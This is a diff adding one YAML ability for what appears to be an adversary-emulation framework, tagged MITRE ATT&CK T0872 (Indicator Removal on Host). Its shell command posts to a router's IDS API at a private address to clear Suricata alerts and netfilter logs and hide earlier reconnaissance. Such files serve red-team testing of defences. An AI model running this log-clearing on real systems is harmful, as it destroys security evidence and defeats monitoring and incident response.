@@ -1,0 +1,18 @@
+---
+
+- id: b8c9d0e1-8888-8888-8888-000000000003
+  name: Router - Clear Evidence Logs
+  description: |
+    Clear Suricata eve.json alerts and netfilter logs to remove
+    evidence of prior reconnaissance activities.
+  tactic: evasion
+  technique_id: T0872
+  technique_name: Indicator Removal on Host
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      curl -s -b /tmp/router.jar
+      -X POST "http://192.168.90.200:5000/ids/clear-alerts" 2>/dev/null &&
+      echo "IDS_ALERTS_CLEARED" ||
+      echo "Log clearing attempted via API"
